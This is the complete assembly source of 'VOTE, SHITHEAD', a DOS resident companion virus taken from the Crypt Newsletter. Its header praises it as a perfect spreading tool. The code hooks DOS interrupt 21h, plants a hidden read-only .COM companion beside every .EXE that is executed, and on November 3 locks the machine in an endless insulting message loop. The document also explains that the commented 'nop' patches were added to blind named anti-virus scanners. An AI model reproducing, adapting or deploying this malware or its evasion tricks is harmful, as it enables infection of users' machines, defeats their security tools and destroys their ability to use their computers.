;****************************************************************************
;*  VOTE, SHITHEAD! virus   Edited by URNST KOUCH for the Crypt Newsletter 7.
;*
;*  TASM/MASM compatible source listing
;*
;*  VOTE, SHITHEAD is a resident, companion virus based upon Little 
;*  Brother code and library .asm routines extracted from Nowhere Man's VCL.
;*  It is also 'patched' with three 'nops' (they are commented) which 
;*  effectively blind a number of a-v scanners. This simple alteration
;*  demonstrates a practical benefit of source code possession: quick 
;*  generation of different virus strains becomes a task within anyone's 
;*  reach. The only tools needed are a number of virus scanners and patience.
;*
;*  In any case, the VOTE virus is just the ideal sample needed for
;*  judicious virus action. It is a PERFECT tool for viral spreading for
;*  a number of reasons.  First, it is a FAST infector. Once resident
;*  VOTE will create a companion file for ANY .EXE executed on ANY drive
;*  and it will do it so quickly that most users, even suspicious ones,
;*  will not notice any slowdown or glitches in machine operation.
;*  Second, 'companion-ed' .EXE's will continue to load and function
;*  properly when VOTE is resident. At the start of the day's computing,
;*  the first 'companion-ed' .EXE executed will misfire ONCE as the virus
;*  becomes resident. If it is re-called it will function perfectly.
;*  Third, VOTE like the INSUFF viruses in the last newsletter strikes
;*  directly at anti-virus suites vulnerable to 'spawning' infections (many
;*  no-names, CPAV, NAV) and creates 'hidden' companion files, an improvement
;*  over the original virus's modus operandi which left them out in plane
;*  sight in the directory. Last, VOTE is very small. In RAM, it is not 
;*  discernible, taking up slightly less that 0.25k. Characteristically,
;*  this is NOT reported by a mem /c display. In fact, 
;*  VOTE is almost invisible to any number of standard diagnostic 
;*  tests. Memory maps by QEMM and Norton's SYSINFO will 
;*  report INT 21 hooked differently. But unless the user can compare
;*  an uncontaminated INTERRUPT report with one when the virus IS present, 
;*  it's unlikely he'll know anything is different. Even then, VOTE is hard
;*  to notice. 
;*
;*  On election day, November 3rd, VOTE will lock an infected machine into 
;*  a loop as it displays a "DID YOU VOTE, SHITHEAD??" query repetitively
;*  across the monitor. Computing will be impossible on Nov. 3rd
;*  unless VOTE is removed from the machine, a task accomplished by unmasking
;*  all the hidden .COMfiles and deleting them while
;*  the virus is NOT resident. At all other times, VOTE is almost completely
;*  transparent.
;****************************************************************************

code            segment
		assume  cs:code,ds:code,es:nothing

		.RADIX  16


oi21            equ     endit
nameptr         equ     endit+4
DTA             equ     endit+8


;****************************************************************************
;*    Check for activation date, then proceed to installation!
;****************************************************************************

		org     100h

begin:     
		call    get_day       ; Get the day, DOS time/date grab
		cmp     ax,0003h      ; Did the function return the 3rd?
		jne     realstrt      ; If equal, continue along stream
		call    get_month     ; Get the month, DOS time/date grab
		cmp     ax,000Bh      ; Did the function return November (11)?
		jne     realstrt      ; If equal, continue to blooie; if not
				      ; skip to loading of virus


blooie:         mov     dx, offset shithead  ;load 'shithead' message
		mov     ah,9                 ;display it and loop
		int     21h                  ;endlessly until
		jmp     blooie               ;user becomes ill and reboots

realstrt:       mov     ax,0044h      ;move VOTE SHITHEAD to empty hole in RAM
		nop                   ;a 'nop' to confuse tbSCAN
		mov     es,ax
		nop                   ;a 'nop' to confuse Datatechnik's AVscan
		mov     di,0100h
		mov     si,di
		mov     cx,endit - begin  ;length of SHITHEAD into cx
	rep     movsb

		mov     ds,cx            ;get original int21 vector
		mov     si,0084h
		mov     di,offset oi21
		mov     dx,offset ni21
		lodsw
		cmp     ax,dx             ;check to see if virus is around
		je      cancel            ; by comparing new interrupt (ni21)
		stosw                     ; vector to current, if it looks
		movsw                     ; the same 'cancel' operation

		push    es                      ;set vector to new handler
		pop     ds
		mov     ax,2521h
		int     21h

cancel:         ret


;****************************************************************************
;*    File-extension masks for checking and naming routines;message text
;****************************************************************************

EXE_txt         db      'EXE',0
COM_txt         db      'COM',0
SHITHEAD        db      "DID YOU VOTE, SHITHEAD??"
		db      07h,07h,'$'

;****************************************************************************
;*              Interrupt handler 24
;****************************************************************************

ni24:           mov     al,03   ;virus critical error handler
		iret            ;prevents embarrassing messages
				;on attempted writes to protected disks

;****************************************************************************
;*              Interrupt handler 21
;****************************************************************************

ni21:           pushf

		push    es
		push    ds
		push    ax
		push    bx
		push    dx
		
		cmp     ax,4B00h         ;now that we're installed
		jne     exit             ; check for 4B00, DOS excutions

doit:           call    infect          ; if one comes by, grab it

exit:           pop      dx             ; if anything else, goto sleep
		pop      bx
		pop      ax
		pop      ds
		pop      es
		popf

		jmp     dword ptr cs:[oi21]  ;call to old int-handler


;****************************************************************************
;*              Try to infect a file (ptr to ASCIIZ-name is DS:DX)
;****************************************************************************

infect:         cld

		mov     word ptr cs:[nameptr],dx  ;save the ptr to the filename
		mov     word ptr cs:[nameptr+2],ds

		mov     ah,2Fh                  ;get old DTA
		int     21
		push    es
		push    bx

		push    cs                      ;set new DTA

		pop     ds
		mov     dx,offset DTA
		mov     ah,1Ah
		int     21

		call    searchpoint            ; here's where we grab a name
		push    di                     ; for ourselves
		mov     si,offset COM_txt       ;is extension 'COM'?
						
		mov     cx,3
	rep     cmpsb
		pop     di
		jz      do_com                ;if so, go to our .COM routine 

		mov     si,offset EXE_txt     ;is extension 'EXE'?
		nop                           ;'nop' to confuse SCAN v95b.
		mov     cl,3
		rep     cmpsb                 
		jnz     return

do_exe:         mov     si,offset COM_txt     ;change extension to COM
		nop                           ;another 'nop' to confuse SCAN
		call    change_ext             

		mov     ax,3300h              ;get ctrl-break flag
		nop
		int     21                    
		push    dx

		cwd                           ;clear the flag
		inc     ax
		push    ax
		int     21

		mov     ax,3524h              ;get int24 vector
		int     21                    
		push    bx                    
		push    es

		push    cs                    ;set int24 vector to new handler
		pop     ds                    ;virus handles machine
		mov     dx,offset ni24        ;exits on attempted writes
		mov     ah,25h                ;to write-protected disks 
		push    ax
		int     21

		lds     dx,dword ptr [nameptr] ;create the virus (with name of .EXE target)
		mov     ah,03Ch                ; DOS create file function
		mov     cx,00100111b           ; CX holds file attributes (all)
		int     021h                   ; makes it hidden/system/read-only
					       ; do it
		xchg    bx,ax                  ;save handle

		push    cs
		pop     ds
		mov     cx,endit - begin        ; write the virus to the created file
		mov     dx,offset begin         ; CX contains length
		mov     ah,40h                  ; write to file function
		int     21

		mov     ah,3Eh                  ;close the file
		int     21


return1:        pop     ax                      ;restore int24 vector
		pop     ds
		pop     dx
		int     21

		pop     ax                      ;restore ctrl-break flag
		pop     dx
		int     21

		mov     si,offset EXE_txt       ;change extension to EXE
		call    change_ext              ;execute EXE-file

return:         mov     ah,1Ah                  ;restore old DTA
		pop     dx
		pop     ds
		int     21

		ret

do_com:         call    findfirst               ;is the COM-file a virus?
		cmp     word ptr cs:[DTA+1Ah],endit - begin  ;compare it to virus length
		jne     return                  ;no, so execute COM-file
		mov     si,offset EXE_txt       ;does the EXE-variant exist?
		call    change_ext
		call    findfirst
		jnc     return                  ;yes, execute EXE-file
		mov     si,offset COM_txt       ;change extension to COM
		call    change_ext
		jmp     short return            ;execute COM-file

;****************************************************************************
;*              Search beginning of extension for name we will usurp  
;****************************************************************************

searchpoint:    les     di,dword ptr cs:[nameptr]
		mov     ch,0FFh
		mov     al,0
	repnz   scasb
		sub     di,4
		ret

;****************************************************************************
;*          Change the extension of the filename (CS:SI -> ext)
;****************************************************************************

change_ext:     call    searchpoint
		push    cs
		pop     ds
		movsw
		movsw
		ret



;****************************************************************************
;*              Find the file
;****************************************************************************

findfirst:      lds     dx,dword ptr [nameptr]
		mov     cl,27h
		mov     ah,4Eh
		int     21
		ret                

;****************************************************************************
;*       Get the day off the system for activation checking
;****************************************************************************
get_day:
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		mov     al,dl                   ; Copy day into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Get back to caller
;*************************************************************************
;*      Get the month off the system for activation checking
;*************************************************************************

get_month:
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		mov     al,dh                   ; Copy month into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Get back to caller


endit:

code            ends
		end     begin
